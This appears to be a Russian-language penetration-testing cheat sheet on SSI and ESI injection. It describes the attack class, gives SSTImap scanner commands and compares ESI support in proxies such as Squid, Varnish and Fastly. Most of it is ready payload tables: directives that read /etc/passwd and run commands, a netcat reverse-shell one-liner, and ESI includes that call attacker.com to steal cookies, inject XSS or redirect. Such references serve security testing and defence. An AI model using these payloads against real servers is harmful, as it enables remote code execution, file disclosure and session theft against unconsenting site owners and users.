**Внедрение серверных включений (Server Side Include Injection)**

Серверные включения (Server Side Includes, SSI) — это директивы, которые размещаются в HTML-страницах и выполняются на сервере в момент отправки страницы. Они позволяют добавлять динамически генерируемое содержимое в существующую HTML-страницу без необходимости обслуживать всю страницу через CGI-программу или другую динамическую технологию.

*   Методология

**Инструменты**

*   **vladko312/SSTImap** — инструмент для автоматического обнаружения SSTI с интерактивным интерфейсом, основанный на epinna/tplmap. Поддерживает обнаружение и эксплуатацию SSI с помощью флагов `--legacy` или `-e SSI`.

Примеры использования:

```bash
# Базовое сканирование с использованием legacy-режима для SSI
python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s

# Интерактивный режим с указанием SSI
python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI

# POST-запрос с заголовком авторизации
python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

**Методология**

SSI-инъекция возникает, когда атакующий может внедрить директивы серверных включений в веб-приложение. SSI — это директивы, которые могут включать файлы, выполнять команды или выводить переменные окружения/атрибуты. Если пользовательский ввод не проходит должную очистку в контексте SSI, этот ввод может быть использован для манипулирования поведением сервера, доступа к конфиденциальной информации или выполнения команд.

Формат SSI: `<!--#directive param="value" -->`

| Описание | Полезная нагрузка |
| :--- | :--- |
| Вывести дату | `<!--#echo var="DATE_LOCAL" -->` |
| Вывести имя документа | `<!--#echo var="DOCUMENT_NAME" -->` |
| Вывести все переменные | `<!--#printenv -->` |
| Установка переменных | `<!--#set var="name" value="Rich" -->` |
| Включить файл | `<!--#include file="/etc/passwd" -->` |
| Включить файл (виртуальный путь) | `<!--#include virtual="/index.html" -->` |
| Выполнить команды | `<!--#exec cmd="ls" -->` |
| Обратная оболочка (reverse shell) | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

**Внедрение на границе (Edge Side Inclusion, ESI)**

HTTP-посредники (суррогаты) не могут отличить подлинные ESI-теги от вышестоящего сервера от вредоносных, встроенных в HTTP-ответ. Это означает, что если атакующему удастся внедрить ESI-теги в HTTP-ответ, суррогат обработает и выполнит их без вопросов, полагая, что это легитимные теги, поступившие с вышестоящего сервера.

Некоторые суррогаты требуют, чтобы обработка ESI была указана в HTTP-заголовке `Surrogate-Control`.

```
Surrogate-Control: content="ESI/1.0"
```

**Примеры ESI-полезных нагрузок:**

| Описание | Полезная нагрузка |
| :--- | :--- |
| Слепое обнаружение | `<esi:include src=http://attacker.com>` |
| XSS | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| Кража cookie | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
| Включить файл | `<esi:include src="supersecret.txt">` |
| Отобразить отладочную информацию | `<esi:debug/>` |
| Добавить заголовок | `<!--esi $add_header('Location','http://attacker.com') -->` |
| Встроенный фрагмент | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

**Сравнение поддержки ESI в различном ПО:**

| Программное обеспечение | Включения (Includes) | Переменные (Vars) | Куки (Cookies) | Требуются заголовки от вышестоящего сервера | Белый список хостов |
| :--- | :--- | :--- | :--- | :--- | :--- |
| Squid3 | Да | Да | Да | Да | Нет |
| Varnish Cache | Да | Нет | Нет | Да | Да |
| Fastly | Да | Нет | Нет | Нет | Да |
| Akamai ESI Test Server (ETS) | Да | Да | Да | Нет | Нет |
| NodeJS' esi | Да | Да | Да | Нет | Нет |
| NodeJS' nodesi | Да | Нет | Нет | Нет | Опционально |
